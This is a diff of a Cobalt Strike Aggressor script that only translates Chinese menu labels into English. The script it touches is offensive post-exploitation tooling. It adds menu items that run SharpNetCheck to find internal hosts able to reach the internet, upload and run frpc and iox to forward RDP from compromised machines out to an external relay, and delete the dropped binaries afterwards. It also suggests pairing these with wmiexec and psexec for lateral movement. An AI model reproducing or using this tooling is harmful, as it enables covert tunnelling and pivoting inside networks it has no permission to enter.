@@ -2,19 +2,19 @@
 #                            #
 #                            #
 #                            #
-#       Xway.cn@panda        #
+#       XWAY.CN@panda        #
 #                            #
 #                            #
 #                            #
 ##############################
-menu "内网穿透" {
+menu "Intranet Penetration" {
 			item "SharpNetCheck" {
 			$bid = $1['@'];
 			$dialog = dialog("SharpNetCheck", %(host => "",,type => "all",bid => $bid), &SharpNetCheck);
-			dialog_description($dialog, "在dnslog中回显内网ip地址和计算机名，可实现内网中的快速定位可出网机器。可配合如wmiexec，psexec等横向工具进行批量检测。");	
+			dialog_description($dialog, "Get IP an PC name by dnslog. You can use it together with wmiexec and psexec.");	
 			drow_combobox($dialog, "type", "-dns/-http/all", @("-dns", "-http","all"));
 			drow_text($dialog, "host", "host/ip:  ");		
-            dbutton_action($dialog, "运行");
+            dbutton_action($dialog, "RUN");
 			dialog_show($dialog);
         }
 sub SharpNetCheck {
@@ -22,11 +22,11 @@ sub SharpNetCheck {
 		bexecute_assembly($bid, script_resource("/script/SharpNetCheck.exe"), $arg);
 }
 	    menu "FRP" {
-			item "上传frpc" {
+			item "Upload FRPC" {
 				$bid = $1;
-				$dialog = dialog("上传frpc", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &FRP);
-				drow_text($dialog, "UploadPath",  "上传路径: "); 	
-				dbutton_action($dialog, "上传");
+				$dialog = dialog("Upload FRPC", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &FRP);
+				drow_text($dialog, "UploadPath",  "UploadPath:"); 	
+				dbutton_action($dialog, "Upload");
 				dialog_show($dialog);
         }
 sub FRP {
@@ -39,13 +39,13 @@ sub FRP {
     }
 
 }
-                item "运行frpc"{
+                item "Run FRPC"{
                     $bid = $1['@'];
-                    $Dialog = dialog("运行frpc",%(ip => "127.0.0.1", port => "3389",bid => $bid),&frpc_run);
-                    dialog_description($Dialog, "运行frpc，使用了frpModify，指定参数即可，proxy端口为23333。");
-                    drow_text($Dialog, "ip", "ip: ");
-                    drow_text($Dialog, "port", "port: ");
-                    dbutton_action($Dialog, "运行");
+                    $Dialog = dialog("Run FRPC",%(ip => "127.0.0.1", port => "3389",bid => $bid),&frpc_run);
+                    dialog_description($Dialog, "Run FRPC by frpModify.");
+                    drow_text($Dialog, "ip", "IP: ");
+                    drow_text($Dialog, "port", "Port: ");
+                    dbutton_action($Dialog, "RUN");
                     dialog_show($Dialog);
                 }
 
@@ -56,19 +56,19 @@ sub frpc_run{
 	bshell($bid, "modify.exe -t  $+ $Name -p  $+ $port");
 }
 
-        	item "删除frpc"{
+        	item "Delete frpc"{
         	local('$bid');
         	foreach $bid ($1){
             	bshell($1, "del /f /s /q modify.exe");
         	}
 		}
     }
-	    menu "iox端口转发" {
-			item "上传iox" {
+	    menu "iox port forwarding" {
+			item "Upload iox" {
 				$bid = $1;
-				$dialog = dialog("上传iox", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &iox);
-				drow_text($dialog, "UploadPath",  "上传路径: "); 	
-				dbutton_action($dialog, "上传");
+				$dialog = dialog("Upload iox", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &iox);
+				drow_text($dialog, "UploadPath",  "UploadPath: "); 	
+				dbutton_action($dialog, "Upload");
 				dialog_show($dialog);
         }
 sub iox {
@@ -77,14 +77,14 @@ sub iox {
 
         bupload($bid, script_resource("/script/iox.exe"));
     }
-                item "运行iox"{
+                item "Run iox"{
                     $bid = $1['@'];
-                    $Dialog = dialog("运行iox",%(lhost => "127.0.0.1:3389", rhost => "*8.8.8.8:3389", hex => "65535",bid => $bid),&iox_run);
+                    $Dialog = dialog("Run iox",%(lhost => "127.0.0.1:3389", rhost => "*8.8.8.8:3389", hex => "65535",bid => $bid),&iox_run);
                     dialog_description($Dialog, "lhost:./iox fwd -r 192.168.0.100:3389 -r *1.1.1.1:8888 -k 656565 rhost:./iox fwd -l *8888 -l 33890 -k 656565");
                     drow_text($Dialog, "lhost", "lhost: ");
                     drow_text($Dialog, "rhost", "rhost: ");
 					drow_text($Dialog, "hex", "hex: ");
-                    dbutton_action($Dialog, "运行");
+                    dbutton_action($Dialog, "RUN");
                     dialog_show($Dialog);
                 }
 
@@ -95,7 +95,7 @@ sub iox_run{
 	$hex = $3['hex'];
 	bshell($bid, "iox.exe fwd -r  $+ $lhost -r  $+ $rhost -k  $+ $hex");
 }  
-        	item "删除iox"{
+        	item "Delete iox"{
         	local('$bid');
         	foreach $bid ($1){
             	bshell($1, "del /f /s /q iox.exe");
